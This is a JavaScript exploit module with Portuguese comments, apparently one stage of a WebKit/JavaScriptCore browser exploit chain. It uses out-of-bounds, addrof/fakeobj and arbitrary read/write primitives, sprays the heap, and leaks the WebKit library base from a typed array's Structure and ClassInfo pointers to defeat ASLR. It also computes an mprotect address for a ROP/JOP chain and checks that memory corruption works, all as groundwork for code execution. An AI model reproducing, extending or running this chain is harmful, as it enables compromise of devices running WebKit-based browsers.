// js/script3/testArrayBufferVictimCrash.mjs (v124 - R60 Final com Vazamento de ASLR via ArrayBuffer m_vector e REVISÃO DE SINTAXE CRÍTICA)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
// - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
// - **Vazamento de ASLR agora realizado com um ARRAYBUFFER/UINT8ARRAY, focando no m_vector/contents_impl pointer.**
// - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
// - Spray volumoso e persistente.
// - Verificação e validação contínuas em cada etapa crítica.
// - Cálculo funcional de endereços de gadgets para ROP/JOP.
// - Teste de resistência ao GC via spray e ciclos.
// - Relatórios de erros mais específicos.
// - Medição de tempo para fases críticas.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v124_R60_ASLR_LEAK_ARRAYBUFFER_MVECTOR_S_FIX"; // Renamed for new strategy

const LOCAL_SHORT_PAUSE = 50;
const LOCAL_MEDIUM_PAUSE = 500;
const LOCAL_LONG_PAUSE = 1000;

let global_spray_objects = []; // For heap grooming

// Local sprays used in Phase 4 (now declared in module scope for cleanup in finally)
let pre_typed_array_spray = [];
let post_typed_array_spray = [];


// Function to scan for relevant pointers in an object
async function scanForRelevantPointersAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM, object_addr) {
    const FNAME = 'scanForRelevantPointersAndLeak';
    logFn(`[SCANNER] Iniciando scanner de offsets relevantes para o objeto em ${object_addr.toString(true)}...`, "subtest", FNAME);

    const SCAN_RANGE_START = 0x0;
    const SCAN_RANGE_END = 0x100; // Scan up to 256 bytes.
    const STEP_SIZE = 0x8;        // Pointers are usually 8-byte aligned (64-bit)

    let scan_results = {
        structure_ptr_offset: null,
        structure_ptr_val: null,
        contents_ptr_offset: null,
        contents_ptr_val: null,
        webkit_base: null
    };

    const S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW_ADV = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);

    for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += STEP_SIZE) {
        let current_scan_address = object_addr.add(offset);
        let read_value = null;
        try {
            read_value = await arb_read(current_scan_address, 8); // Read 8 bytes (a pointer)

            // Filter values that look like valid pointers
            if (isAdvancedInt64Object(read_value) &&
                !read_value.equals(AdvancedInt64.Zero) &&
                !read_value.equals(AdvancedInt64.NaNValue) &&
                read_value.high() !== 0x7ff80000 // Discard NaN doubles
            ) {
                logFn(`[SCANNER] Candidato encontrado no offset 0x${offset.toString(16).padStart(2, '0')}: ${read_value.toString(true)}`, "debug", FNAME);

                // Check for Structure*
                if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                    scan_results.structure_ptr_offset = offset;
                    scan_results.structure_ptr_val = read_value;
                    logFn(`[SCANNER] POSSÍVEL PONTEIRO DE STRUCTURE* (offset 0x${offset.toString(16)}): ${read_value.toString(true)}`, "info", FNAME);

                    // Try to follow Structure* to ClassInfo* and deduce WebKit base
                    try {
                        const class_info_ptr_candidate_addr = read_value.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
                        const class_info_ptr_candidate = await arb_read(class_info_ptr_candidate_addr, 8);
                        if (isAdvancedInt64Object(class_info_ptr_candidate) &&
                            !class_info_ptr_candidate.equals(AdvancedInt64.Zero) &&
                            !class_info_ptr_candidate.equals(AdvancedInt64.NaNValue) &&
                            class_info_ptr_candidate.high() !== 0x7ff80000
                        ) {
                            let calculated_webkit_base = class_info_ptr_candidate.sub(S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW_ADV);
                            const is_likely_webkit_base = (calculated_webkit_base.low() & 0xFFF) === 0x000;

                            if (is_likely_webkit_base) {
                                logFn(`[SCANNER] -> Encontrada ClassInfo* no ${read_value.toString(true).add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET).toString(true)}: ${class_info_ptr_candidate.toString(true)}`, "info", FNAME);
                                logFn(`[SCANNER] -> BASE WEBKIT CALCULADA (VIA Structure->ClassInfo): ${calculated_webkit_base.toString(true)} (Aligned: ${is_likely_webkit_base ? 'YES' : 'NO'})`, "vuln", FNAME);
                                scan_results.webkit_base = calculated_webkit_base;
                                // If we find a WebKit base, we could stop scanning early, but for now, continue to see all.
                            }
                        }
                    } catch (e_classinfo) {
                        logFn(`[SCANNER] Error following Structure* to ClassInfo* at offset 0x${offset.toString(16)}: ${e_classinfo.message}`, "error", FNAME);
                    }
                }

                // Check for ArrayBuffer Contents/Vector pointer (relevant for TypedArrays)
                if (offset === JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || offset === JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET) {
                    scan_results.contents_ptr_offset = offset;
                    scan_results.contents_ptr_val = read_value;
                    logFn(`[SCANNER] POSSÍVEL PONTEIRO DE DADOS/CONTENTS (offset 0x${offset.toString(16)}): ${read_value.toString(true)}`, "info", FNAME);
                }

            }
        } catch (e_scan) {
            logFn(`[SCANNER] ERRO ao ler no offset 0x${offset.toString(16)}: ${e_scan.message}`, "error", FNAME);
        }
    } // End of for loop

    logFn(`[SCANNER] Varredura de offsets concluída.`, "subtest", FNAME);
    return scan_results;
}


// Modified to accept logFn, pauseFn, and JSC_OFFSETS
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
    const startTime = performance.now();

    try { // <<<<<<<<<< LINHA 113 NO ÚLTIMO LOG DE ERRO (DEVE SER OK AGORA)
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        // --- FASE 0: Validar primitivas arb_read/arb_write (já feita no testIsolatedAddrofFakeobjCoreAndDump, mas re-validar para a cadeia principal é bom) ---
        logFn("--- FASE 0: Validando primitivas arb_read/arb_write com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errorMsg = "Falha crítica: As primitivas arb_read/arb_write não estão funcionando. Abortando a exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitivas arb_read/arb_write validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
        const sprayStartTime = performance.now();
        const SPRAY_COUNT = 200000;
        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 20);
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 2: Obtaining OOB and addrof/fakeobj primitives with validations ---
        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        if (!getOOBDataView()) {
            const errorMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // NEW: Initialize core addrof/fakeobj primitives
        // Already initialized and tested in testIsolatedAddrofFakeobjCoreAndDump, but safe to call again.
        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");


        // --- FASE 3: Self-contained R/W Primitives (via core_exploit.mjs) ---
        logFn("--- FASE 3: Primitivas de Leitura/Escrita Arbitrária fornecidas pelo core_exploit.mjs ---", "subtest");
        logFn(`Primitivas de Leitura/Escrita Arbitrária ('arb_read' e 'arb_write') estão prontas e são acessadas diretamente do core_exploit.mjs.`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // --- FASE 4: REAL and CLEAN WebKit Library Base Leak and Gadget Discovery (Functional - VIA ArrayBuffer m_vector) ---
        logFn("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA ArrayBuffer m_vector) ---", "subtest");
        const leakPrepStartTime = performance.now();
        let webkit_base_address = null;

        logFn("Iniciando vazamento REAL da base ASLR da WebKit através de um ArrayBuffer (focando no ponteiro de dados)...", "info");

        // 1. Create an ArrayBuffer and/or Uint8Array as a leak target.
        const leak_target_array_buffer = new ArrayBuffer(0x1000); // E.g., 4096 bytes
        const leak_target_uint8_array = new Uint8Array(leak_target_array_buffer); // View to fill

        leak_target_uint8_array.fill(0xCC); // Fill with a pattern to facilitate identification if we need to dump it
        logFn(`ArrayBuffer/Uint8Array alvo criado e preenchido.`, "debug");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 2. Obtain the memory address of the ArrayBuffer (or its View, which is a JSArrayBufferView).
        const typed_array_addr = addrof_core(leak_target_uint8_array);
        logFn(`[REAL LEAK] Endereço do Uint8Array (JSArrayBufferView): ${typed_array_addr.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 3. Use the scanner to find the ArrayBuffer's pointer or its contents (m_vector).
        logFn(`[REAL LEAK] Chamando scanner para encontrar ponteiros relevantes (Structure* ou m_vector) do ArrayBufferView...`, "info");
        const scan_results_leak_phase = await scanForRelevantPointersAndLeak(
            logFn,
            pauseFn,
            JSC_OFFSETS_PARAM,
            typed_array_addr
        );

        let contents_pointer_addr = null;
        let structure_pointer_from_ab_view = null;

        if (scan_results_leak_phase.contents_ptr_val) {
            contents_pointer_addr = scan_results_leak_phase.contents_ptr_val;
            logFn(`[REAL LEAK] Scanner encontrou o PONTEIRO DOS CONTEÚDOS (m_vector): ${contents_pointer_addr.toString(true)} no offset 0x${scan_results_leak_phase.contents_ptr_offset.toString(16)}.`, "good");
        } else {
            logFn(`[REAL LEAK] Scanner NÃO encontrou o ponteiro de conteúdos (m_vector).`, "warn");
            // Try to read directly from the expected offset if the scanner failed to identify it
            logFn(`[REAL LEAK] Tentando ler ASSOCIATED_ARRAYBUFFER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET.toString(16)}) do Uint8Array (JSArrayBufferView)...`, "info");
            contents_pointer_addr = await arb_read(typed_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET), 8);
            logFn(`[REAL LEAK] Valor lido do ASSOCIATED_ARRAYBUFFER_OFFSET: ${contents_pointer_addr.toString(true)}`, "leak");
        }

        if (scan_results_leak_phase.structure_ptr_val) {
            structure_pointer_from_ab_view = scan_results_leak_phase.structure_ptr_val;
            logFn(`[REAL LEAK] Scanner encontrou o PONTEIRO DA STRUCTURE* do ABView: ${structure_pointer_from_ab_view.toString(true)} no offset 0x${scan_results_leak_phase.structure_ptr_offset.toString(16)}.`, "good");
        } else {
            logFn(`[REAL LEAK] Scanner NÃO encontrou o ponteiro da Structure* do ABView.`, "warn");
        }


        if (!isAdvancedInt64Object(contents_pointer_addr) || contents_pointer_addr.equals(AdvancedInt64.Zero) || contents_pointer_addr.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao obter ponteiro dos conteúdos do ArrayBuffer. Endereço inválido: ${contents_pointer_addr ? contents_pointer_addr.toString(true) : 'N/A'}. Não podemos continuar o vazamento de ASLR.`;
            logFn(errorMsg, "critical"); // Corrigido
            throw new Error(errorMsg);    // Corrigido
        }

        // We will use the ClassInfo pointer of the JSArrayBufferView (i.e., of the Uint8Array)
        // The s_info is static data in the WebKit module.
        // The ClassInfo* pointer is in the ArrayBufferView's Structure.
        // First, we need the Structure pointer of the JSArrayBufferView.
        let actual_structure_ptr_for_ab_view = structure_pointer_from_ab_view;
        if (!actual_structure_ptr_for_ab_view) {
            // If the scanner didn't find it, we try the default JSCell offset (0x8) for Structure*
            logFn(`[REAL LEAK] Using default offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} for Structure* of ABView.`, "warn");
            actual_structure_ptr_for_ab_view = await arb_read(typed_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        }

        if (!isAdvancedInt64Object(actual_structure_ptr_for_ab_view) || actual_structure_ptr_for_ab_view.equals(AdvancedInt64.Zero) || actual_structure_ptr_for_ab_view.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao obter ponteiro da Structure* do ArrayBufferView (Uint8Array). Value: ${actual_structure_ptr_for_ab_view ? actual_structure_ptr_for_ab_view.toString(true) : 'N/A'}.`;
            logFn(errorMsg, "critical"); // Corrigido
            throw new Error(errorMsg);    // Corrigido
        }
        logFn(`[REAL LEAK] Ponteiro da Structure* do ArrayBufferView (Uint8Array): ${actual_structure_ptr_for_ab_view.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // From the ArrayBufferView's Structure, read the ClassInfo*
        const class_info_ptr_ab_view = await arb_read(actual_structure_ptr_for_ab_view.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8);
        if (!isAdvancedInt64Object(class_info_ptr_ab_view) || class_info_ptr_ab_view.equals(AdvancedInt64.Zero) || class_info_ptr_ab_view.equals(AdvancedInt64.NaNValue)) {
            const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo da Structure do ArrayBufferView. Value: ${class_info_ptr_ab_view ? class_info_ptr_ab_view.toString(true) : 'N/A'}.`;
            logFn(errorMsg, "critical"); // Corrigido
            throw new Error(errorMsg);    // Corrigido
        }
        logFn(`[REAL LEAK] Ponteiro para a ClassInfo (do JSArrayBufferView::s_info): ${class_info_ptr_ab_view.toString(true)}`, "leak");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // 5. Calculate the WebKit base address using JSC::JSArrayBufferView::s_info
        const S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
        webkit_base_address = class_info_ptr_ab_view.sub(S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW);

        logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");

        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) { // Also check alignment
            throw new Error("[REAL LEAK] WebKit base address calculated to zero or not correctly aligned. Leak might have failed.");
        } else {
            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ArrayBufferView.", "good");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // Gadget Discovery (Functional)
        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        // --- PHASE 5: Functional R/W Verification and Resistance Test (Post-ASLR Leak) ---
        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects[5001]; // Use an object from the spray
        logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");

        // Read the address of the spray object
        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        // Using the faked object for R/W test post-ASLR leak for greater safety.
        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak); // Recreate a fakeobj for the spray object
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        // Try to write and read a property of the spray object via faked_obj
        const original_val_prop = test_obj_post_leak.val1;
        logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');

        faked_obj_for_post_leak_test.val1 = 0x1337BEEF; // Write a new value to the property
        await pauseFn(LOCAL_SHORT_PAUSE);
        const read_back_val_prop = faked_obj_for_post_leak_test.val1;

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, 'good');
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }


        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 5;
        // Now, we'll use arb_read/arb_write with a "real" object address,
        // e.g., reading and writing to the Butterfly of a spray object.
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write(butterfly_addr_of_spray_obj, test_value_arb_rw, 8); // Write to butterfly
                const read_back_value_arb_rw = await arb_read(butterfly_addr_of_spray_obj, 8); // Read from butterfly

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência Pós-Vazamento #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência Pós-Vazamento #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência Pós-Vazamento #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(10);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        // Clear global sprays to help GC
        pre_typed_array_spray = [];
        post_typed_array_spray = [];
        global_spray_objects = []; // Clear main spray

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Uncaged Strategy)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified) Enhanced Max Robustness' }
    };
}
